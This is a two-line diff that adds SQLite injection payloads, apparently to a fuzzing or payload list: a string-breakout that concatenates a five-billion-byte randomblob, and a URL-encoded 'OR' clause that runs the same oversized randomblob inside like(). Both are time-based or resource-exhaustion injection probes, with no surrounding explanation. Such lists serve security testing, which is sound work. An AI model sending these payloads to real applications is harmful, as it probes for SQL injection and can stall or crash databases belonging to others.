@@ -1,0 +1,2 @@
+'  || upper(hex(randomblob(5000000000))) || '
+9999%20OR%20(select%20like(%27abcdefg%27%2Cupper(hex(randomblob(5000000000)))))
